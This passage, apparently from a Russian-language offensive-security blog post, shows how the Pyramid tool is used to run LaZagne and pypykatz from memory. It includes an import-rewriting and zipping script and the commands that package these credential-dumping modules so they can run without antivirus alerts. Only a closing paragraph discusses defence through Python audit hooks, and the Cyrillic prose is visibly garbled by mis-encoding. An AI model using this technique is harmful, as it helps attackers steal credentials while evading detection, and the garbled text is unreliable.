for file in glob(str('**/*.py'), recursive=True):
	if not is_binary(file):
		import_path = str((Path(cwd)).joinpath(file).parent)
		import_path = import_path.replace('.py', '').replace('/', '.')

		with open(file, 'r', encoding='utf-8') as f:
			contents = f.read()

		# (from . )import -> (from qwe.asd )import
		contents = re.sub(r'from\s+\.\s+', f'from {import_path} ', contents)
		# (from .a)bc import -> (from zxc.a)bc import
		contents = re.sub(r'from\s+\.([a-zA-Z])', f'from {import_path}.\\1', contents)

		with open(file, 'w', encoding='utf-8') as f:
			f.write(contents)

os.chdir('..')
os.system(f'zip -qr {cwd}.zip {cwd}')
os.system(f'mv {cwd}.zip {base_cwd}')
```

–ó–∞–ø—É—Å—Ç–∏–≤ —Å–∫—Ä–∏–ø—Ç —Å —É–∫–∞–∑–∞–Ω–∏–µ –ø—É—Ç–∏ –¥–æ –∫–∞–∂–¥–æ–≥–æ –ø–∞–∫—É–µ–º–æ–≥–æ –º–æ–¥—É–ª—è, —Ç—ã –ø–æ–ª—É—á–∏—à—å –≤ —Ç–µ–∫—É—â–µ–π –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏ –≤—Å–µ –∑–∏–ø—ã, –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã–µ –¥–ª—è –∑–∞–ø—É—Å–∫–∞ –ª—É—Ç–µ—Ä–∞.

```terminal?prompt=$
~$ ./fix_imports.py future-0.18.2/src/future
~$ ./fix_imports.py pyasn1/pyasn1
~$ ./fix_imports.py rsa-4.9/rsa/
~$ ./fix_imports.py asn1crypto/asn1crypto
~$ ./fix_imports.py unicrypto/unicrypto
~$ ./fix_imports.py minidump/minidump
~$ ./fix_imports.py minikerberos/minikerberos
~$ ./fix_imports.py pypykatz/pypykatz
~$ ./fix_imports.py LaZagne/Windows/lazagne
```

[![lazagne-fix-imports.png](/assets/images/python-pyramid/lazagne-fix-imports.png)](/assets/images/python-pyramid/lazagne-fix-imports.png)
{:.center-image}

–§–∏–∫—Å–∏–º –æ—Ç–Ω–æ—Å–∏—Ç–µ–ª—å–Ω—ã–µ –∏–º–ø–æ—Ä—Ç—ã
{:.quote}

–ö–æ–Ω–µ—á–Ω–æ, —ç—Ç–æ –Ω–µ –≤—Å–µ –º–∞–Ω–∏–ø—É–ª—è—Ü–∏–∏, –∫–æ—Ç–æ—Ä—ã–µ –º–Ω–µ –ø—Ä–∏—à–ª–æ—Å—å –ø—Ä–æ–¥–µ–ª–∞—Ç—å —Å –∏—Å—Ö–æ–¥–Ω–∏–∫–∞–º–∏ LaZagne, —á—Ç–æ–±—ã –æ–Ω–∞ –∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ –∑–∞–ø—É—Å—Ç–∏–ª–∞—Å—å –Ω–∞ Python 3, –Ω–æ —ç—Ç–æ —É–∂–µ –∞—Å–ø–µ–∫—Ç—ã, —Å–ø–µ—Ü–∏—Ñ–∏—á–Ω—ã–µ –¥–ª—è –∫–∞–∂–¥–æ–≥–æ –º–æ–¥—É–ª—è. –ö–æ–Ω–µ—á–Ω—ã–π —Ä–µ–∑—É–ª—å—Ç–∞—Ç —Ä–∞–±–æ—Ç—ã –º–æ–∂–Ω–æ –Ω–∞–±–ª—é–¥–∞—Ç—å [–≤ —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä–∏–∏](https://github.com/naksyn/Pyramid/blob/main/Server/lazagne.zip) –∞–≤—Ç–æ—Ä–∞ Pyramid.

–ö–∞–∫ –∏—Ç–æ–≥ –∏–º–µ–µ–º —Å—Ç—Ä–∞—à–Ω—ã–π —Å–æ–Ω –æ–ø–µ—Ä–∞—Ç–∏–≤–Ω–∏–∫–∞ SOC –Ω–∞ —è–≤—É ‚Äî –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç—å –∑–∞–ø—É—Å—Ç–∏—Ç—å LaZagne –±–µ–∑ –∞–ª–µ—Ä—Ç–æ–≤ –æ—Ç AV!

[![lazagne-run.png](/assets/images/python-pyramid/lazagne-run.png)](/assets/images/python-pyramid/lazagne-run.png)
{:.center-image}

–ù–µ –∂–µ–ª–∞–µ—Ç–µ –ª–∞–∑–∞–Ω—å–∏?
{:.quote}

# –í—ã–≤–æ–¥—ã

–°–µ–≥–æ–¥–Ω—è –º—ã —Ä–∞—Å—Å–º–æ—Ç—Ä–µ–ª–∏ –æ—á–µ–Ω—å –ø–µ—Ä—Å–ø–µ–∫—Ç–∏–≤–Ω—ã–π, –Ω–∞ –º–æ–π –≤–∑–≥–ª—è–¥, —Å–ø–æ—Å–æ–± –±–µ–∑—Ñ–∞–π–ª–æ–≤–æ–π –¥–æ—Å—Ç–∞–≤–∫–∏ –∏ –∏—Å–ø–æ–ª–Ω–µ–Ω–∏—è –º–∞–ª–≤–∞—Ä–Ω–æ–≥–æ –∫–æ–¥–∞ –∏–∑ —Å–ø–ª–µ–ø–æ–π –∑–æ–Ω—ã AV –∏–ª–∏ EDR ‚Äî ¬´–≤–∞–Ω–∏–ª—å–Ω–æ–≥–æ¬ª –∏–Ω—Ç–µ—Ä–ø—Ä–µ—Ç–∞—Ç–æ—Ä–∞ Python. –¢–µ –ø—Ä–∏–º–µ—Ä—ã, –∫–æ—Ç–æ—Ä—ã–µ –º—ã —Ä–∞–∑–æ–±—Ä–∞–ª–∏ ‚Äî –≤—Å–µ–≥–æ –ª–∏—à—å –≤–µ—Ä—Ö—É—à–∫–∞ –∞–π—Å–±–µ—Ä–≥–∞: –Ω–∞–ø—Ä–∏–º–µ—Ä, –≤ C2-—Ñ—Ä–µ–π–º–≤–æ—Ä–∫–µ [Pupy](https://github.com/n1nj4sec/pupy) –∞–≤—Ç–æ—Ä –≤–æ–æ–±—â–µ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç –ø–µ—Ä–µ—Å–æ–±—Ä–∞–Ω–Ω—ã–π –∏–Ω—Ç–µ—Ä–ø—Ä–µ—Ç–∞—Ç–æ—Ä, –∑–∞–≥—Ä—É–∂–∞—é—â–∏–π—Å—è –∏–∑ –ø–∞–º—è—Ç–∏ –ø–æ –ø—Ä–∏–Ω—Ü–∏–ø—É [Reflective DLL](https://github.com/stephenfewer/ReflectiveDLLInjection), –∏ –∫–æ –≤—Å–µ–º—É –ø—Ä–æ—á–µ–º—É —É–º–µ—é—â–∏–π –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å `.pyc` –∏ `.pyd` —Ä–∞—Å—à–∏—Ä–µ–Ω–∏—è –±–µ–∑ –∏—Ö –∑–∞–ø–∏—Å–∏ –Ω–∞ –¥–∏—Å–∫.

–î—Ä—É–≥–æ–π –ø—Ä–∏–º–µ—Ä ‚Äî –∞–≥–µ–Ω—Ç [Medusa](https://github.com/MythicAgents/Medusa) C2-—Ñ—Ä–µ–π–º–≤–æ—Ä–∫–∞ [Mythic](https://github.com/its-a-feature/Mythic), —Å–ø–æ—Å–æ–±–Ω—ã–π —É–¥–∞–ª–µ–Ω–Ω–æ [–∏–º–ø–æ—Ä—Ç–∏—Ä–æ–≤–∞—Ç—å –∏–∑ –ø–∞–º—è—Ç–∏ —Ç—Ä–µ–±—É–µ–º—ã–µ –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–∏ Python](https://ajpc500.github.io/c2/In-memory-Python-Modules-With-The-Medusa-Mythic-Agent/) –ø–æ –∫–æ–º–∞–Ω–¥–µ –æ–ø–µ—Ä–∞—Ç–æ—Ä–∞.

–ß—Ç–æ–±—ã —É–ª—É—á—à–∏—Ç—å Pyramid, –º–æ–∂–Ω–æ –±—ã–ª–æ –±—ã –Ω–∞–ø–∏—Å–∞—Ç—å –≤—Å–ø–æ–º–æ–≥–∞—Ç–µ–ª—å–Ω—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏ –¥–ª—è –∏–º–ø–æ—Ä—Ç–∞ –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–µ–π –∏–∑ –µ–¥–∏–Ω–æ–≥–æ –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–Ω–æ–≥–æ –∞—Ä—Ö–∏–≤–∞, –∫–æ—Ç–æ—Ä—ã–π –º–æ–∂–Ω–æ –±—ã–ª–æ –±—ã –ø–æ–ª–æ–∂–∏—Ç—å –Ω–∞ –¥–∏—Å–∫ —Ä—è–¥–æ–º —Å –∏–Ω—Ç–µ—Ä–ø—Ä–µ—Ç–∞—Ç–æ—Ä–æ–º ‚Äî —ç—Ç–æ –±—ã–ª–æ –±—ã –ø–æ–ª–µ–∑–Ω–æ, –∫–æ–≥–¥–∞ –∞—Ç–∞–∫—É—é—â–∏–π –Ω–µ –º–æ–∂–µ—Ç –¥–µ—Ä–Ω—É—Ç—å –∑–∏–ø—ã –ø–æ HTTP. –û—Å—Ç–∞–≤–ª—é —ç—Ç–æ –≤ –∫–∞—á–µ—Å—Ç–≤–µ –¥–æ–º–∞—à–Ω–µ–≥–æ –∑–∞–¥–∞–Ω–∏—è –¥–ª—è —á–∏—Ç–∞—Ç–µ–ª—è.

–ò –Ω–∞–ø–æ—Å–ª–µ–¥–æ–∫ –æ —Ç–æ–º, –∫–∞–∫ –∑–∞—â–∏—Ç–∏—Ç—å—Å—è –æ—Ç –≤—Å–µ–≥–æ —ç—Ç–æ–≥–æ –∑–º–µ–∏–Ω–æ–≥–æ –±–µ—Å–ø—Ä–µ–¥–µ–ª–∞: –µ—Å—Ç—å —Ç–∞–∫–∞—è –∫–æ–Ω—Ü–µ–ø—Ü–∏—è –∫–∞–∫ **Python Runtime Audit Hooks**, –ø—Ä–µ–¥–ª–æ–∂–µ–Ω–Ω–∞—è –≤ [PEP 578](https://peps.python.org/pep-0578/). –í –µ–µ —Ä–∞–º–∫–∞—Ö —Ä–∞–∑—Ä–∞–±–æ—Ç—á–∏–∫–∞–º, –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–æ–º –∏ —Å–∞–º–æ–º—É –∑–∞—â–∏—Ç–Ω–æ–º—É –ü–û –∏–Ω—Ç–µ—Ä–ø—Ä–µ—Ç–∞—Ç–æ—Ä –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª—è–µ—Ç –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å—ã –¥–ª—è –æ—Ç—Å–ª–µ–∂–∏–≤–∞–Ω–∏—è –≤—Å–µ–≥–æ —Ç–æ–≥–æ –Ω–µ–ø–æ–Ω—è—Ç–Ω–æ–≥–æ –∏ –∑–∞–≤–µ–¥–æ–º–æ –æ–ø–∞—Å–Ω–æ–≥–æ, —á—Ç–æ –ø—Ä–æ–∏—Å—Ö–æ–¥–∏—Ç –ø–æ–¥ –µ–≥–æ –∫—Ä—ã–ª–æ–º (–Ω–∞–ø—Ä–∏–º–µ—Ä, —á—Ç–æ –ø–µ—Ä–µ–¥–∞–µ—Ç—Å—è —Ñ—É–Ω–∫—Ü–∏—è–º `compile`, `exec`, `eval`, `import` –∏ –¥—Ä—É–≥–æ–µ). –ò —ç—Ç–æ –¥–∞–∂–µ –ø–æ–º–æ–≥–ª–æ –±—ã –∑–∞—â–∏—Ç–∏—Ç—å—Å—è –æ—Ç –ª–æ–≥–∏–∫–∏ –∏–º–ø–æ—Ä—Ç–∞ –º–æ–¥—É–ª–µ–π, —Ä–µ–∞–ª–∏–∑–æ–≤–∞–Ω–Ω–æ–π –≤ Pyramid.

[![pep-578.png](/assets/images/python-pyramid/pep-578.png)](/assets/images/python-pyramid/pep-578.png)
{:.center-image}

Python Runtime Audit Hooks (PEP 578)
{:.quote}

–ù–æ, –∫–∞–∫ –æ–±—ã—á–Ω–æ –≤–æ–¥–∏—Ç—Å—è, —ç—Ç–æ —Å–ª–æ–∂–Ω–æ, —Å–∫—É—á–Ω–æ, <strike>–Ω–∏–∫–æ–º—É –Ω–µ –∏–Ω—Ç–µ—Ä–µ—Å–Ω–æ</strike> –∏ –Ω–∞ –¥–∞–Ω–Ω—ã–π –º–æ–º–µ–Ω—Ç –ø—Ä–∞–∫—Ç–∏—á–µ—Å–∫–∏ –Ω–∏–≥–¥–µ –Ω–µ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è (—Ö–æ—Ç—è [@SkelSec](https://twitter.com/SkelSec) —É–∂–µ [—Ä–∞—Å—Å—Ç—Ä–æ–∏–ª—Å—è](https://ep2019.europython.eu/media/conference/slides/8MGqsQG-auditing-hooks-and-security-transparency-for-cpython.pdf)). –ù–µ —Å–º–æ—Ç—Ä—è –Ω–∞ —ç—Ç–æ, —É–∂–µ –µ—Å—Ç—å –ø—Ä–æ–±–Ω—ã–µ –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ã –¥–ª—è —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏–∏ –∏–≤–µ–Ω—Ç–æ–≤, –ø–æ—Å—Ç—É–ø–∞—é—â–∏—Ö –æ—Ç –∑–∞—â–∏—Ç–Ω—ã—Ö —Ö—É–∫–æ–≤, [–≤ Windows Event Log](https://github.com/zooba/spython/tree/master/WindowsEventLog) (–∏ –Ω–µ —Ç–æ–ª—å–∫–æ), –Ω–æ —ç—Ç–æ —É–∂–µ —Å–æ–≤—Å–µ–º –¥—Ä—É–≥–∞—è –∏—Å—Ç–æ—Ä–∏—è.
